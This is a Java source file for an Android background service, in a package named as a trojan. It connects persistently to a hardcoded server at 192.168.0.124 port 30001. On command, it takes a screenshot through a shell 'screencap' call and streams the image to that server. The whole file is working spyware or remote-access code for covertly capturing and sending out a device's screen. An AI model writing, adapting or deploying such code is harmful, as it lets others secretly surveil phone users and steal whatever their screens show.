package com.liuyihui.trojan.linkserver;

import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.nfc.Tag;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.support.annotation.Nullable;
import android.text.TextUtils;
import android.util.Log;
import android.util.LogPrinter;
import android.view.TextureView;
import android.view.View;

import com.alibaba.fastjson.JSON;
import com.liuyihui.trojan.shell.ShellUtils;
import com.liuyihui.trojan.util.CastUtil;
import com.liuyihui.trojan.util.FileUtil;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.file.attribute.BasicFileAttributes;

import javax.xml.transform.Source;

/**
 * 通过socket与服务器连接,实时互发信息
 *
 * @author liuyi 2018年1月22日16:43:59
 */
public class LinkService extends Service {
    private final static String TAG = "LinkService";
    private Socket socket = null;
    private Object socketClilentThreadLock = new Object();
    private SendThreadLock sendThreadLock = new SendThreadLock();

    /**
     * 构造方法
     */
    public LinkService() {
    }

    /**
     * 创建回调
     */
    @Override
    public void onCreate() {
        super.onCreate();
        final Thread socketClientThread = new Thread(new Runnable() {
            @Override
            public void run() {
                socket = new Socket();
                while (true) {
                    try {
                        //防止死循环
                        Thread.sleep(1000);
                        if (!socket.isConnected()) {
                            try {
                                Log.i(TAG, "connect server ...");
                                socket.connect(new InetSocketAddress("192.168.0.124", 30001), 5000);
                                Log.i(TAG, "connect success.");
                                //这里可以做一些刚连上时的动作, 比如刚连上时给服务器发消息
                            } catch (IOException e) {
                                Log.e(TAG, "连接socket服务器失败:" + e.getMessage(), e);
                                continue;
                            }
                        }


                        //接收线程
                        startReceiveThread(socket);
                        //发送线程
                        startSendThread(socket);

                        //如果socket连接状态, 就一直等. 若发现socket连接断开, 打断此等待
                        synchronized (socketClilentThreadLock) {
                            socketClilentThreadLock.wait();
                        }
                    } catch (InterruptedException e) {
                        Log.e(TAG, e.getMessage(), e);
                    }
                }
            }
        }, "socketClientThread");
        socketClientThread.setDaemon(true);
        socketClientThread.start();
    }

    /**
     * 发送线程
     *
     * @param socket
     * @return
     */
    public void startSendThread(final Socket socket) {
        final Thread sendThread = new Thread(new Runnable() {
            String tag = "sendThread";

            @Override
            public void run() {
                //获取输出流
                DataOutputStream dos = null;
                try {
                    dos = new DataOutputStream(socket.getOutputStream());
                } catch (IOException e) {
                    Log.e(tag, "获取输出流失败:", e);
                }
                while (true) {
                    try {
                        synchronized (sendThreadLock) {
                            //进入等待,等收到通知后发数据
                            Log.i(tag, "等待发送...");
                            sendThreadLock.wait();
                            Log.i(tag, "发送...");
                        }
                        Integer msg = sendThreadLock.pollMsg();
                        if (msg == null) {//空消息不执行动作
                            Log.i(tag, "要发送消息为空");
                            continue;
                        }

                        //发数据
                        File snapshotFile = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/tyt.png");
                        //先将代表文件长度的数组发送过去
                        byte[] headerBytes = CastUtil.longToByteArray(snapshotFile.length());
                        dos.write(headerBytes);
                        dos.flush();
                        //文件输入流,发送文件内字节
                        FileInputStream fis = new FileInputStream(Environment.getExternalStorageDirectory().getAbsolutePath() + "/tyt.png");
                        dos.write(new byte[]{});
                        byte[] bytes = new byte[4 * 1024];
                        while (fis.read(bytes) != -1) {
                            dos.write(bytes);
                        }
                        dos.flush();
                    } catch (InterruptedException e) {
                        Log.e(tag, e.getMessage(), e);
                    } catch (FileNotFoundException e) {
                        Log.e(tag, e.getMessage(), e);
                    } catch (IOException e) {
                        Log.e(tag, e.getMessage(), e);
                    }
                }
            }
        }, "sendThread");
        /*if (sendThread.isAlive()) {
            sendThread.interrupt();
        }*/
        sendThread.setDaemon(true);
        sendThread.start();
    }

    /**
     * 接收线程
     * <p>
     * 会一直阻塞运行
     *
     * @param socket
     */
    public void startReceiveThread(final Socket socket) {
        Thread receiveThread = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    //读取服务器发来信息,socket断开连接之前, 输入流一直可用, 如果服务器不发送消息或关闭流,read方法一直阻塞等待读取字节
                    DataInputStream dis = new DataInputStream(socket.getInputStream());
                    //一个字节一个字节的读
                    byte[] buffByte = new byte[1];
                    while (dis.read(buffByte) != -1) {


                        //解析读到的字节
                        Log.e(TAG, "receive::" + buffByte[0]);
                        //if 截图消息: 截图并发出
                        if (buffByte[0] == 2) {
                            snapshotTytAndSendToServer(socket);
                        } else {
                            //未识别的消息
                            Log.i(TAG, "未识别的消息" + buffByte[0]);
                        }
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }, "receiveThread");
        receiveThread.setDaemon(true);
        receiveThread.start();
    }

    /**
     * 截图发送
     *
     * @param socket
     */
    public void snapshotTytAndSendToServer(Socket socket) {
        //截图
        String sdcardPath = Environment.getExternalStorageDirectory().getAbsolutePath();
        ShellUtils.execCommand("screencap -p " + sdcardPath + "/tyt.png", false);

        //通知发送线程发送
        synchronized (sendThreadLock) {
            sendThreadLock.notifyAllWithMsg(1);
        }
    }

    /**
     * 每次启动调用,包括重复启动时
     *
     * @param intent
     * @param flags
     * @param startId
     * @return
     */
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return super.onStartCommand(intent, flags, startId);
    }

    /**
     * 销毁回调
     */
    @Override
    public void onDestroy() {
        super.onDestroy();
        //关闭socket连接
        try {
            if (socket != null) {
                socket.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
}
